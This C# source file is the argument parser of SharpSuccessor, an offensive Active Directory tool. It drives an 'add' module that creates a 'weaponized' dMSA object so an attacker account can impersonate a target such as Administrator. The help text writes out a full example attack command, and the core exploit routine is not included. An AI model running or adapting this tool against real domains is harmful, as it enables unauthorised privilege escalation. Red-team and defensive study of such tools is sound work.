using System;
using System.Collections.Generic;
using System.Linq;
using System.DirectoryServices;

namespace SharpSuccessor.Modules
{
    internal class ArgParse
    {
        public static void Help()
        {
            string help =
                "[*] Create and weaponize a dMSA object, setting the target for impersonation, path of the vulnerable OU, account to access to weaponized dMSA, and the name of the dMSA object:\n" +
                "\tSharpSuccessor.exe add /impersonate:Administrator /path:\"ou=test,dc=lab,dc=lan\" /account:jdoe /name:attacker_dMSA\r\n";
            Console.WriteLine(help);
        }

        static List<string> sMods = new List<string>
        {
            "add",

        };

        // Adapted from Certify https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Domain/ArgumentParser.cs#L8
        public static Dictionary<string, string> Parse(IEnumerable<string> args)
        {
            var arguments = new Dictionary<string, string>();
            try
            {
                foreach (var argument in args)
                {
                    var idx = argument.IndexOf(':');
                    if (idx > 0)
                    {
                        arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                    }
                    else
                    {
                        idx = argument.IndexOf('=');
                        if (idx > 0)
                        {
                            arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                        }
                        else
                        {
                            arguments[argument] = string.Empty;
                        }
                    }
                }

                return arguments;
            }
            catch
            {
                Console.WriteLine("[!] Error parsing arguments");
                return null;
            }
        }

        public static void Execute(string[] args)
        {
            if (args.Length == 0)
            {
                Help();
            }
            else if (sMods.Contains(args.First()))
            {
                try
                {
                    switch (args.First().ToLower())
                    {
                        case "add":
                            if (args.Length > 1)
                            {
                                string access = null;
                                string target = null;
                                string path = null;
                                string dMSAName = null; 
                                Dictionary<string, string> cmd = Parse(args);

                                if (cmd == null)
                                {
                                    return;
                                }

                                cmd.TryGetValue("/account", out access);
                                cmd.TryGetValue("/impersonate", out target);
                                cmd.TryGetValue("/path", out path);
                                cmd.TryGetValue("/name", out dMSAName);

                                if(access == null || target == null || path ==null || dMSAName == null)
                                {
                                    Console.WriteLine("[!] Missing required arguments: account,impersonate,path,name\n[!] See help menu for more information.");
                                    return;
                                }

                                dMSA.CreatedMSA(path, dMSAName, access, target);


                            }
                            break;
                    }
                }
                catch (IndexOutOfRangeException)
                {
                    Console.WriteLine("[!] Command invalid");
                }

            }
            else
            {
                Help();
            }
        }
    }
}
